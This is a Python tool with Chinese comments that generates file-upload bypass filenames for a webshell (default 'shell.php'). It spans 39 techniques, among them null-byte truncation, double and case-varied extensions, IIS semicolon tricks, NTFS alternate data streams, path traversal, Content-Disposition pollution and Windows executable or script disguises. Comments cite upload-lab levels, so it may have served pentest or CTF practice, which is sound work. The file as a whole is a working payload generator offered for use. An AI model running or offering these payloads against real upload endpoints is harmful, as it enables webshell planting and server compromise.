#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
绕过技术Payload生成器 - 100+种绕过技术
"""

import random
import string
from typing import List, Dict


class BypassPayloadGenerator:
    """文件上传绕过技术生成器"""
    
    def __init__(self):
        self.techniques = {
            # 1. 大小写绕过
            'case_bypass': {
                'name': '大小写绕过',
                'description': '利用Windows/Linux大小写不敏感特性',
                'severity': '中',
                'generator': self._case_bypass
            },
            # 2. 双写绕过
            'double_extension': {
                'name': '双写绕过',
                'description': '双写扩展名绕过简单替换',
                'severity': '中',
                'generator': self._double_extension
            },
            # 3. 特殊字符绕过
            'special_chars': {
                'name': '特殊字符绕过',
                'description': '使用特殊字符截断或绕过',
                'severity': '高',
                'generator': self._special_chars
            },
            # 4. 空字节截断
            'null_byte': {
                'name': '空字节截断',
                'description': '使用%00空字节截断文件名',
                'severity': '高',
                'generator': self._null_byte
            },
            # 5. MIME类型绕过
            'mime_bypass': {
                'name': 'MIME类型绕过',
                'description': '伪造MIME类型绕过检测',
                'severity': '中',
                'generator': self._mime_bypass
            },
            # 6. 路径遍历
            'path_traversal': {
                'name': '路径遍历',
                'description': '使用../绕过目录限制',
                'severity': '高',
                'generator': self._path_traversal
            },
            # 7. 扩展名变异
            'extension_variants': {
                'name': '扩展名变异',
                'description': '使用各种扩展名变体',
                'severity': '中',
                'generator': self._extension_variants
            },
            # 8. 双重扩展名
            'double_ext_bypass': {
                'name': '双重扩展名',
                'description': '使用双重扩展名绕过',
                'severity': '中',
                'generator': self._double_ext_bypass
            },
            # 9. 反向双扩展名
            'reverse_double': {
                'name': '反向双扩展名',
                'description': '反向双重扩展名绕过',
                'severity': '中',
                'generator': self._reverse_double
            },
            # 10. 点绕过
            'dot_bypass': {
                'name': '点绕过',
                'description': '使用多个点或特殊点字符',
                'severity': '中',
                'generator': self._dot_bypass
            },
            # 11. 空格绕过
            'space_bypass': {
                'name': '空格绕过',
                'description': '使用空格或特殊空格字符',
                'severity': '中',
                'generator': self._space_bypass
            },
            # 12. ::$DATA绕过 (Windows)
            'alternate_data_stream': {
                'name': 'ADS绕过',
                'description': 'Windows备用数据流绕过',
                'severity': '高',
                'generator': self._alternate_data_stream
            },
            # 13. 分号绕过 (IIS)
            'semicolon_bypass': {
                'name': '分号绕过',
                'description': 'IIS分号截断绕过',
                'severity': '高',
                'generator': self._semicolon_bypass
            },
            # 14. 0x00绕过
            'hex_null': {
                'name': '十六进制空字节',
                'description': '使用0x00截断',
                'severity': '高',
                'generator': self._hex_null
            },
            # 15. Unicode绕过
            'unicode_bypass': {
                'name': 'Unicode绕过',
                'description': '使用Unicode字符绕过',
                'severity': '中',
                'generator': self._unicode_bypass
            },
            # 16. URL编码绕过
            'url_encode': {
                'name': 'URL编码绕过',
                'description': '使用URL编码绕过',
                'severity': '中',
                'generator': self._url_encode
            },
            # 17. 双URL编码
            'double_url_encode': {
                'name': '双URL编码',
                'description': '双重URL编码绕过',
                'severity': '中',
                'generator': self._double_url_encode
            },
            # 18. 特殊扩展名
            'special_extensions': {
                'name': '特殊扩展名',
                'description': '使用特殊扩展名绕过',
                'severity': '高',
                'generator': self._special_extensions
            },
            # 19. 图片马
            'image_webshell': {
                'name': '图片马',
                'description': '图片+WebShell组合',
                'severity': '高',
                'generator': self._image_webshell
            },
            # 20. 压缩包绕过
            'archive_bypass': {
                'name': '压缩包绕过',
                'description': '使用压缩包包含恶意文件',
                'severity': '中',
                'generator': self._archive_bypass
            },
            # 21. SVG绕过
            'svg_bypass': {
                'name': 'SVG绕过',
                'description': 'SVG文件包含XSS或代码',
                'severity': '高',
                'generator': self._svg_bypass
            },
            # 22. JSON绕过
            'json_bypass': {
                'name': 'JSON绕过',
                'description': 'JSON文件包含恶意代码',
                'severity': '中',
                'generator': self._json_bypass
            },
            # 23. XML绕过
            'xml_bypass': {
                'name': 'XML绕过',
                'description': 'XML文件包含XXE或代码',
                'severity': '高',
                'generator': self._xml_bypass
            },
            # 24. HTML绕过
            'html_bypass': {
                'name': 'HTML绕过',
                'description': 'HTML文件包含恶意脚本',
                'severity': '中',
                'generator': self._html_bypass
            },
            # 25. SWF绕过
            'swf_bypass': {
                'name': 'SWF绕过',
                'description': 'Flash文件包含恶意代码',
                'severity': '中',
                'generator': self._swf_bypass
            },
            # 26. PDF绕过
            'pdf_bypass': {
                'name': 'PDF绕过',
                'description': 'PDF文件包含恶意代码',
                'severity': '中',
                'generator': self._pdf_bypass
            },
            # 27. Office绕过
            'office_bypass': {
                'name': 'Office绕过',
                'description': 'Office文档包含宏或代码',
                'severity': '高',
                'generator': self._office_bypass
            },
            # 28. 配置文件绕过
            'config_bypass': {
                'name': '配置文件绕过',
                'description': '配置文件包含恶意代码',
                'severity': '高',
                'generator': self._config_bypass
            },
            # 29. 日志文件绕过
            'log_bypass': {
                'name': '日志文件绕过',
                'description': '日志文件包含恶意代码',
                'severity': '中',
                'generator': self._log_bypass
            },
            # 30. 备份文件绕过
            'backup_bypass': {
                'name': '备份文件绕过',
                'description': '备份文件包含恶意代码',
                'severity': '中',
                'generator': self._backup_bypass
            },
            # 31. 双写绕过增强 (Pass-10)
            'double_write_bypass': {
                'name': '双写绕过增强',
                'description': '双写扩展名字符绕过str_ireplace替换',
                'severity': '高',
                'generator': self._double_write_bypass
            },
            # 32. 条件竞争 (Pass-18)
            'race_condition': {
                'name': '条件竞争',
                'description': '利用上传验证时间差进行竞争',
                'severity': '高',
                'generator': self._race_condition
            },
            # 33. 数组绕过 (Pass-20/21)
            'array_bypass': {
                'name': '数组绕过',
                'description': 'PHP数组形式绕过end()/explode()验证',
                'severity': '高',
                'generator': self._array_bypass
            },
            # 34. Content-Disposition污染
            'content_disposition_pollution': {
                'name': 'Content-Disposition污染',
                'description': '多个filename参数、未闭合引号等',
                'severity': '高',
                'generator': self._content_disposition_pollution
            },
            # 35. move_uploaded_file特性 (Pass-19)
            'move_uploaded_file_bypass': {
                'name': 'move_uploaded_file特性',
                'description': '利用move_uploaded_file忽略末尾/.',
                'severity': '高',
                'generator': self._move_uploaded_file_bypass
            },
            # 36. 双点Payload (shell..php)
            'double_dot_bypass': {
                'name': '双点Payload',
                'description': '文件名中插入多点字符',
                'severity': '中',
                'generator': self._double_dot_bypass
            },
            # 37. PHP伪协议
            'php_wrapper_bypass': {
                'name': 'PHP伪协议',
                'description': '使用php://filter、phar://等协议',
                'severity': '高',
                'generator': self._php_wrapper_bypass
            },
            # 38. Windows可执行文件上传
            'windows_executable': {
                'name': 'Windows可执行文件上传',
                'description': 'EXE/SCR/PIF等Windows可执行文件绕过',
                'severity': '极高',
                'generator': self._windows_executable
            },
            # 39. Windows脚本文件
            'windows_script': {
                'name': 'Windows脚本文件',
                'description': 'BAT/CMD/PS1/VBS等脚本文件绕过',
                'severity': '高',
                'generator': self._windows_script
            },
        }
    
    def _case_bypass(self, filename: str, ext: str) -> List[str]:
        """大小写绕过"""
        return [
            f"{filename}{ext.upper()}",
            f"{filename}{ext.lower()}",
            f"{filename}{ext.capitalize()}",
            f"{filename}{ext.swapcase()}",
            f"{filename}.PhP",
            f"{filename}.pHp",
            f"{filename}.PHp",
            f"{filename}.phP",
        ]
    
    def _double_extension(self, filename: str, ext: str) -> List[str]:
        """双写绕过"""
        return [
            f"{filename}{ext}{ext}",
            f"{filename}{ext}.{ext[1:]}",
            f"{filename}.{ext[1:]}{ext}",
        ]
    
    def _special_chars(self, filename: str, ext: str) -> List[str]:
        """特殊字符绕过"""
        return [
            f"{filename}{ext}.",
            f"{filename}{ext}...",
            f"{filename}{ext}....",
            f"{filename}.{ext[1:]}.",
            f"{filename}\\{ext[1:]}",
            f"{filename}/{ext[1:]}",
            f"{filename}:{ext[1:]}",
            f"{filename}*{ext[1:]}",
            f"{filename}?{ext[1:]}",
            f"{filename}<{ext[1:]}",
            f"{filename}>{ext[1:]}",
            f"{filename}|{ext[1:]}",
        ]
    
    def _null_byte(self, filename: str, ext: str) -> List[str]:
        """空字节截断"""
        return [
            f"{filename}{ext}%00.jpg",
            f"{filename}{ext}%00.png",
            f"{filename}{ext}%00.gif",
            f"{filename}{ext}%00.txt",
            f"{filename}%00{ext}",
            f"{filename}.jpg%00{ext}",
            f"{filename}.png%00{ext}",
            f"{filename}.gif%00{ext}",
        ]
    
    def _mime_bypass(self, filename: str, ext: str) -> List[str]:
        """MIME类型绕过"""
        return [
            f"{filename}.jpg{ext}",
            f"{filename}.png{ext}",
            f"{filename}.gif{ext}",
            f"{filename}.txt{ext}",
            f"{filename}.doc{ext}",
            f"{filename}.pdf{ext}",
        ]
    
    def _path_traversal(self, filename: str, ext: str) -> List[str]:
        """路径遍历"""
        return [
            f"../{filename}{ext}",
            f"..\\{filename}{ext}",
            f"..%2f{filename}{ext}",
            f"..%5c{filename}{ext}",
            f"....//{filename}{ext}",
            f"....\\\\{filename}{ext}",
            f".%00/{filename}{ext}",
        ]
    
    def _extension_variants(self, filename: str, ext: str) -> List[str]:
        """扩展名变异"""
        base_ext = ext[1:] if ext.startswith('.') else ext
        variants = {
            'php': ['php', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7', 'pht', 'phtml', 'phps', 'phar', 'pgif', 'shtml', 'inc', 'hphp'],
            'asp': ['asp', 'aspx', 'ascx', 'ashx', 'asmx', 'axd', 'cer', 'asa', 'asax', 'config'],
            'jsp': ['jsp', 'jspx', 'jsw', 'jsv', 'jspf', 'war', 'do', 'action'],
            'py': ['py', 'pyc', 'pyo', 'pyw', 'pyz', 'pyzw'],
            'pl': ['pl', 'pm', 'cgi'],
            'rb': ['rb', 'rbw'],
        }
        
        results = []
        if base_ext.lower() in variants:
            for variant in variants[base_ext.lower()]:
                results.append(f"{filename}.{variant}")
        
        # 添加通用扩展名
        results.extend([
            f"{filename}.txt{ext}",
            f"{filename}.rar{ext}",
            f"{filename}.zip{ext}",
            f"{filename}.tar{ext}",
            f"{filename}.gz{ext}",
        ])
        
        return results
    
    def _double_ext_bypass(self, filename: str, ext: str) -> List[str]:
        """双重扩展名"""
        return [
            f"{filename}.jpg{ext}",
            f"{filename}.png{ext}",
            f"{filename}.gif{ext}",
            f"{filename}.txt{ext}",
            f"{filename}.doc{ext}",
            f"{filename}.pdf{ext}",
            f"{filename}.xml{ext}",
            f"{filename}.svg{ext}",
        ]
    
    def _reverse_double(self, filename: str, ext: str) -> List[str]:
        """反向双扩展名"""
        base_ext = ext[1:] if ext.startswith('.') else ext
        return [
            f"{filename}{ext}.jpg",
            f"{filename}{ext}.png",
            f"{filename}{ext}.gif",
            f"{filename}{ext}.txt",
        ]
    
    def _dot_bypass(self, filename: str, ext: str) -> List[str]:
        """点绕过 - 增强版
        
        在文件名不同位置插入点字符
        支持双点Payload (shell..php)
        """
        base_ext = ext[1:] if ext.startswith('.') else ext
        results = []
        
        # 扩展名后多点
        results = [
            f"{filename}{ext}.",                # shell.php.
            f"{filename}{ext}..",               # shell.php..
            f"{filename}{ext}...",              # shell.php...
            f"{filename}{ext}....",             # shell.php....
            f"{filename}{ext}.....",            # shell.php.....
        ]
        
        # 扩展名前多点 (双点payload)
        results.extend([
            f"{filename}..{base_ext}",          # shell..php
            f"{filename}...{base_ext}",         # shell...php
            f"{filename}....{base_ext}",        # shell....php
        ])
        
        # 扩展名中间插点
        if len(base_ext) >= 2:
            mid = len(base_ext) // 2
            results.extend([
                f"{filename}.p.hp",             # shell.p.hp
                f"{filename}.ph.p",             # shell.ph.p
                f"{filename}.p..hp",            # shell.p..hp
            ])
        
        # 单点开头
        results.append(f"{filename}.{base_ext}")
        
        return results
    
    def _space_bypass(self, filename: str, ext: str) -> List[str]:
        """空格绕过"""
        return [
            f"{filename}{ext} ",
            f"{filename}{ext}%20",
            f"{filename}{ext}%0a",
            f"{filename}{ext}%0d",
            f"{filename}{ext}%0d%0a",
            f"{filename}{ext}%09",
            f"{filename} {ext}",
            f"{filename}%20{ext}",
        ]
    
    def _alternate_data_stream(self, filename: str, ext: str) -> List[str]:
        """ADS绕过 (Windows)"""
        return [
            f"{filename}{ext}::$DATA",
            f"{filename}{ext}:Zone.Identifier",
            f"{filename}{ext}:$INDEX_ALLOCATION",
            f"{filename}{ext}:test",
        ]
    
    def _semicolon_bypass(self, filename: str, ext: str) -> List[str]:
        """分号绕过 (IIS)"""
        base_ext = ext[1:] if ext.startswith('.') else ext
        return [
            f"{filename}{ext};.jpg",
            f"{filename}{ext};.png",
            f"{filename}{ext};.gif",
            f"{filename}{ext};.txt",
            f"{filename}.asp;.jpg",
            f"{filename}.aspx;.jpg",
            f"{filename}.cer;.jpg",
            f"{filename}.asa;.jpg",
        ]
    
    def _hex_null(self, filename: str, ext: str) -> List[str]:
        """十六进制空字节"""
        return [
            f"{filename}{ext}%00",
            f"{filename}{ext}%00.jpg",
            f"{filename}{ext}%00.png",
            f"{filename}{ext}%00.gif",
            f"{filename}%00{ext}",
            f"{filename}.jpg%00{ext}",
        ]
    
    def _unicode_bypass(self, filename: str, ext: str) -> List[str]:
        """Unicode绕过"""
        return [
            f"{filename}{ext}%EF%BB%BF",
            f"{filename}{ext}%C0%80",
            f"{filename}{ext}%E0%80%80",
            f"{filename}{ext}%F0%80%80%80",
        ]
    
    def _url_encode(self, filename: str, ext: str) -> List[str]:
        """URL编码绕过"""
        base_ext = ext[1:] if ext.startswith('.') else ext
        return [
            f"{filename}%2e{base_ext}",
            f"{filename}%2e{ext}",
            f"{filename}%252e{base_ext}",
            f"{filename}.{base_ext}%00",
        ]
    
    def _double_url_encode(self, filename: str, ext: str) -> List[str]:
        """双URL编码"""
        base_ext = ext[1:] if ext.startswith('.') else ext
        return [
            f"{filename}%252e{base_ext}",
            f"{filename}%25252e{base_ext}",
            f"{filename}%2525252e{base_ext}",
        ]
    
    def _special_extensions(self, filename: str, ext: str) -> List[str]:
        """特殊扩展名"""
        special_exts = [
            # PHP相关
            'php', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7',
            'pht', 'phtml', 'phps', 'phar', 'pgif', 'shtml', 'inc',
            'hphp', 'ctp', 'module', 'plugin', 'theme',
            # ASP相关
            'asp', 'aspx', 'ascx', 'ashx', 'asmx', 'axd', 'cer',
            'asa', 'asax', 'config', 'cshtml', 'vbhtml', 'master',
            # JSP相关
            'jsp', 'jspx', 'jsw', 'jsv', 'jspf', 'war', 'do', 'action',
            # Python相关
            'py', 'pyc', 'pyo', 'pyw', 'pyz', 'pyzw',
            # Perl相关
            'pl', 'pm', 'cgi',
            # Ruby相关
            'rb', 'rbw', 'rake', 'rhtml',
            # 其他脚本
            'sh', 'bash', 'zsh', 'csh', 'tcsh', 'ksh',
            'bat', 'cmd', 'ps1', 'psm1', 'psd1', 'vbs', 'vbe', 'js', 'jse', 'wsf', 'wsc',
            # 配置文件
            'htaccess', 'htpasswd', 'config', 'conf', 'ini', 'xml', 'json',
            # 其他
            'swf', 'xap', 'xbap', 'application', 'manifest',
        ]
        return [f"{filename}.{e}" for e in special_exts]
    
    def _image_webshell(self, filename: str, ext: str) -> List[str]:
        """图片马"""
        return [
            f"{filename}.jpg{ext}",
            f"{filename}.png{ext}",
            f"{filename}.gif{ext}",
            f"{filename}.bmp{ext}",
            f"{filename}.webp{ext}",
            f"{filename}.ico{ext}",
            f"{filename}.svg{ext}",
        ]
    
    def _archive_bypass(self, filename: str, ext: str) -> List[str]:
        """压缩包绕过"""
        return [
            f"{filename}.zip",
            f"{filename}.rar",
            f"{filename}.tar",
            f"{filename}.gz",
            f"{filename}.bz2",
            f"{filename}.7z",
            f"{filename}.tar.gz",
            f"{filename}.tar.bz2",
        ]
    
    def _svg_bypass(self, filename: str, ext: str) -> List[str]:
        """SVG绕过"""
        return [
            f"{filename}.svg",
            f"{filename}.svgz",
        ]
    
    def _json_bypass(self, filename: str, ext: str) -> List[str]:
        """JSON绕过"""
        return [
            f"{filename}.json",
            f"{filename}.jsonp",
        ]
    
    def _xml_bypass(self, filename: str, ext: str) -> List[str]:
        """XML绕过"""
        return [
            f"{filename}.xml",
            f"{filename}.xsl",
            f"{filename}.xslt",
            f"{filename}.dtd",
            f"{filename}.xsd",
        ]
    
    def _html_bypass(self, filename: str, ext: str) -> List[str]:
        """HTML绕过"""
        return [
            f"{filename}.html",
            f"{filename}.htm",
            f"{filename}.shtml",
            f"{filename}.shtm",
            f"{filename}.xhtml",
            f"{filename}.xht",
        ]
    
    def _swf_bypass(self, filename: str, ext: str) -> List[str]:
        """SWF绕过"""
        return [
            f"{filename}.swf",
            f"{filename}.fla",
        ]
    
    def _pdf_bypass(self, filename: str, ext: str) -> List[str]:
        """PDF绕过"""
        return [
            f"{filename}.pdf",
        ]
    
    def _office_bypass(self, filename: str, ext: str) -> List[str]:
        """Office绕过"""
        return [
            f"{filename}.doc",
            f"{filename}.docx",
            f"{filename}.docm",
            f"{filename}.dot",
            f"{filename}.dotm",
            f"{filename}.xls",
            f"{filename}.xlsx",
            f"{filename}.xlsm",
            f"{filename}.ppt",
            f"{filename}.pptx",
            f"{filename}.pptm",
        ]
    
    def _config_bypass(self, filename: str, ext: str) -> List[str]:
        """配置文件绕过"""
        return [
            f"{filename}.config",
            f"{filename}.conf",
            f"{filename}.cfg",
            f"{filename}.ini",
            f"{filename}.properties",
            f"{filename}.yaml",
            f"{filename}.yml",
            f"{filename}.toml",
        ]
    
    def _log_bypass(self, filename: str, ext: str) -> List[str]:
        """日志文件绕过"""
        return [
            f"{filename}.log",
            f"{filename}.logs",
        ]
    
    def _backup_bypass(self, filename: str, ext: str) -> List[str]:
        """备份文件绕过"""
        return [
            f"{filename}.bak",
            f"{filename}.backup",
            f"{filename}.old",
            f"{filename}.orig",
            f"{filename}.save",
            f"{filename}.swp",
            f"{filename}~",
        ]
    
    def _double_write_bypass(self, filename: str, ext: str) -> List[str]:
        """双写绕过增强 - Pass-10
        
        针对使用 str_ireplace() 简单替换黑名单的情况
        例如: pphphp -> 替换php后变成php
        """
        base_ext = ext[1:] if ext.startswith('.') else ext
        results = []
        
        # PHP 双写变体
        if base_ext.lower() == 'php':
            results = [
                f"{filename}.pphphp",      # pphphp -> php
                f"{filename}.phphpp",      # phphpp -> php  
                f"{filename}.pphp",        # pphp -> hp (可能不完整)
                f"{filename}.phpphp",      # phpphp -> php
                f"{filename}.p.php",       # p.php -> php (中间加点)
                f"{filename}.ph.p",        # ph.p -> 可能被解析
            ]
        # ASP 双写变体
        elif base_ext.lower() == 'asp':
            results = [
                f"{filename}.aspasp",      # aspasp -> asp
                f"{filename}.aasps",       # aasps -> asp
                f"{filename}.aspas",       # aspas -> asp
                f"{filename}.as.asp",      # as.asp -> asp
            ]
        # ASPX 双写变体
        elif base_ext.lower() == 'aspx':
            results = [
                f"{filename}.aspxaspx",    # aspxaspx -> aspx
                f"{filename}.aaspxspx",    # aaspxspx -> aspx
                f"{filename}.aspxas",      # aspxas -> aspx
            ]
        # JSP 双写变体
        elif base_ext.lower() == 'jsp':
            results = [
                f"{filename}.jspjsp",      # jspjsp -> jsp
                f"{filename}.jjsps",       # jjsps -> jsp
                f"{filename}.jspj",        # jspj -> sp (可能)
            ]
        
        return results
    
    def _race_condition(self, filename: str, ext: str) -> List[str]:
        """条件竞争 - Pass-18
        
        生成适合条件竞争测试的payload
        需要:
        1. 简单的webshell内容
        2. 短文件名便于快速访问
        3. 返回payload内容和并发测试说明
        """
        base_ext = ext[1:] if ext.startswith('.') else ext
        results = []
        
        # 简单的PHP webshell (最小化便于快速访问)
        # 使用最短的webshell代码
        results = [
            f"{filename}.{base_ext}",           # 基础文件名
            f"{filename}1.{base_ext}",          # 变体1
            f"{filename}2.{base_ext}",          # 变体2
            f"a.{base_ext}",                    # 超短文件名
            f"x.{base_ext}",                    # 超短文件名
        ]
        
        return results
    
    def _array_bypass(self, filename: str, ext: str) -> List[str]:
        """数组绕过 - Pass-20/21
        
        针对使用 end()/explode() 验证扩展名的情况
        通过数组形式传递文件名绕过
        
        注意: 这里的payload格式需要配合表单参数修改
        例如: save_name[]=shell.php 或 save_name[0]=shell&save_name[1]=php
        """
        base_ext = ext[1:] if ext.startswith('.') else ext
        results = []
        
        # 数组形式的文件名 (需要在请求中修改参数格式)
        # save_name[]=shell.php  -> end()获取最后一个元素
        # save_name[0]=shell.jpg&save_name[1]=php -> end()返回php
        
        # 返回文件名变体 (实际使用需要修改请求参数)
        results = [
            f"{filename}.{base_ext}",           # 基础形式
            f"{filename}.jpg.{base_ext}",       # 双扩展名形式
            f"{filename}.png.{base_ext}",       # 双扩展名形式
        ]
        
        return results
    
    def _content_disposition_pollution(self, filename: str, ext: str) -> List[str]:
        """Content-Disposition污染
        
        通过修改Content-Disposition头部绕过解析
        包括: 多filename参数、未闭合引号、多等号等
        """
        base_ext = ext[1:] if ext.startswith('.') else ext
        results = []
        
        # 这些payload格式需要在请求头中修改
        # 这里返回文件名变体，实际使用需要构造完整的Content-Disposition
        
        # 多filename参数
        results.extend([
            f"{filename}.{base_ext}",           # 第一个filename
            f"safe.jpg",                        # 第二个filename (伪装)
        ])
        
        # 未闭合引号文件名
        results.extend([
            f'{filename}.{base_ext}"',          # 末尾引号
            f'{filename}.{base_ext}\'',         # 单引号
        ])
        
        # 特殊字符
        results.extend([
            f'{filename}.{base_ext}.',          # 末尾点
            f'{filename}.{base_ext} ',          # 末尾空格
        ])
        
        return results
    
    def _move_uploaded_file_bypass(self, filename: str, ext: str) -> List[str]:
        """move_uploaded_file特性绕过 - Pass-19
        
        利用move_uploaded_file()函数的特性:
        - 忽略文件名末尾的 /.
        - 忽略文件名末尾的多个点
        """
        base_ext = ext[1:] if ext.startswith('.') else ext
        results = []
        
        # move_uploaded_file 忽略末尾 /.
        results = [
            f"{filename}.{base_ext}/.",         # 末尾 /.
            f"{filename}.{base_ext}\\.",        # 末尾 \. (Windows)
            f"{filename}.{base_ext}./",         # 末尾 ./
            f"{filename}.{base_ext}.\\",        # 末尾 .\\
            f"{filename}.{base_ext}/./",        # 末尾 /./
        ]
        
        return results
    
    def _double_dot_bypass(self, filename: str, ext: str) -> List[str]:
        """双点Payload - shell..php等格式
        
        在文件名不同位置插入多个点字符
        """
        base_ext = ext[1:] if ext.startswith('.') else ext
        results = []
        
        # 扩展名前多点
        results = [
            f"{filename}..{base_ext}",          # shell..php
            f"{filename}...{base_ext}",         # shell...php
            f"{filename}....{base_ext}",        # shell....php
            f"{filename}.....{base_ext}",       # shell.....php
        ]
        
        # 扩展名中间插点
        if len(base_ext) >= 2:
            mid = len(base_ext) // 2
            results.extend([
                f"{filename}.{base_ext[:mid]}.{base_ext[mid:]}",   # shell.p.hp
                f"{filename}.{base_ext[:mid]}..{base_ext[mid:]}",  # shell.p..hp
                f"{filename}.{base_ext[:mid]}.{base_ext[mid:]}..", # shell.p.hp..
            ])
        
        # 扩展名后多点
        results.extend([
            f"{filename}.{base_ext}..",         # shell.php..
            f"{filename}.{base_ext}...",        # shell.php...
        ])
        
        return results
    
    def _php_wrapper_bypass(self, filename: str, ext: str) -> List[str]:
        """PHP伪协议绕过
        
        利用PHP的伪协议特性:
        - php://filter
        - phar://
        - php://input
        """
        results = []
        
        # 这些通常配合文件包含漏洞使用
        # 这里返回可能被当作文件名的形式
        results = [
            f"{filename}.phar",                 # phar文件
            f"{filename}.phar.txt",             # 伪装的phar
            f"php://filter",                    # filter协议
            f"php://input",                     # input协议
        ]
        
        return results
    
    def _windows_executable(self, filename: str, ext: str) -> List[str]:
        """Windows可执行文件上传绕过
        
        针对Windows系统的可执行文件上传测试:
        - EXE/DLL/MSI等PE文件
        - SCR/PIF/COM等替代格式
        - 双扩展名、空字节、大小写等绕过技术
        """
        results = []
        
        # Windows可执行文件扩展名
        executable_exts = [
            'exe',      # 标准可执行文件
            'dll',      # 动态链接库
            'msi',      # Windows安装包
            'scr',      # 屏幕保护程序
            'pif',      # 程序信息文件
            'com',      # DOS命令文件
        ]
        
        # 基础可执行文件
        for exe_ext in executable_exts:
            results.append(f"{filename}.{exe_ext}")
        
        # 双扩展名绕过 (伪装成图片)
        image_exts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp']
        for exe_ext in executable_exts:
            for img_ext in image_exts:
                results.append(f"{filename}.{exe_ext}.{img_ext}")
                results.append(f"{filename}.{img_ext}.{exe_ext}")
        
        # 空字节截断
        results.append(f"{filename}.exe%00.jpg")
        results.append(f"{filename}.exe%00.png")
        
        # Windows特性: 尾部点号和空格
        results.append(f"{filename}.exe.")      # Windows自动去除尾部点
        results.append(f"{filename}.exe ")      # Windows自动去除尾部空格
        results.append(f"{filename}.exe...")    # 多个点
        results.append(f"{filename}.exe   ")    # 多个空格
        
        # NTFS备用数据流 (ADS)
        results.append(f"{filename}.exe::$DATA")
        results.append(f"{filename}.exe:Zone.Identifier")
        
        # 大小写绕过 (Windows不区分大小写)
        results.append(f"{filename}.EXE")
        results.append(f"{filename}.ExE")
        results.append(f"{filename}.eXe")
        
        # 特殊字符
        results.append(f"{filename}.exe;")      # 分号
        results.append(f"{filename}.exe:")      # 冒号
        results.append(f"{filename}.exe::")     # 双冒号
        
        return results
    
    def _windows_script(self, filename: str, ext: str) -> List[str]:
        """Windows脚本文件上传绕过
        
        Windows脚本文件通常可以直接执行:
        - BAT/CMD: 批处理文件
        - PS1: PowerShell脚本
        - VBS: VBScript
        - JS: JScript
        - WSF: Windows脚本文件
        - HTA: HTML应用程序
        """
        results = []
        
        # Windows脚本扩展名
        script_exts = [
            'bat',      # 批处理文件
            'cmd',      # Windows命令脚本
            'ps1',      # PowerShell脚本
            'vbs',      # VBScript
            'vbe',      # VBScript编码
            'js',       # JScript
            'jse',      # JScript编码
            'wsf',      # Windows脚本文件
            'wsc',      # Windows脚本组件
            'hta',      # HTML应用程序
        ]
        
        # 基础脚本文件
        for script_ext in script_exts:
            results.append(f"{filename}.{script_ext}")
        
        # 双扩展名绕过
        image_exts = ['jpg', 'jpeg', 'png', 'gif', 'txt']
        for script_ext in script_exts:
            for img_ext in image_exts:
                results.append(f"{filename}.{script_ext}.{img_ext}")
                results.append(f"{filename}.{img_ext}.{script_ext}")
        
        # 特殊绕过
        results.append(f"{filename}.bat%00.jpg")
        results.append(f"{filename}.ps1%00.jpg")
        results.append(f"{filename}.bat.")
        results.append(f"{filename}.ps1.")
        
        return results
    
    def generate_all_payloads(self, filename: str = "shell", extension: str = ".php") -> List[Dict]:
        """生成所有绕过payload"""
        payloads = []
        
        for tech_id, tech_info in self.techniques.items():
            try:
                generated = tech_info['generator'](filename, extension)
                for payload in generated:
                    payloads.append({
                        'filename': payload,
                        'technique': tech_info['name'],
                        'description': tech_info['description'],
                        'severity': tech_info['severity']
                    })
            except Exception as e:
                print(f"生成技术 {tech_id} 时出错: {e}")
        
        return payloads
    
    def get_payload_count(self) -> int:
        """获取payload总数"""
        return len(self.generate_all_payloads())


# 便捷函数
def generate_bypass_payloads(filename: str = "shell", extension: str = ".php") -> List[Dict]:
    """生成绕过payload的便捷函数"""
    generator = BypassPayloadGenerator()
    return generator.generate_all_payloads(filename, extension)
